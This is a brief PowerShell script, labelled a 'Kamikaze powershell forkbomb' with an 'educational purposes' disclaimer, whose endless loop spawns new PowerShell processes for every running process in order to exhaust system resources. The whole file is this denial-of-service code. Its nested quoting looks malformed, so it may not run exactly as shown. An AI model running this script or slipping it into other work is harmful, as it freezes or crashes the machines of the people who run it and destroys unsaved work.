# Kamikaze powershell forkbomb
# Do not use; purely for educational purposes.


while ($true) {
    foreach ($i in gps) {
        Invoke-item "$pshome\powershell.exe {Invoke-item "$pshome\powershell.exe"}"
    }
}
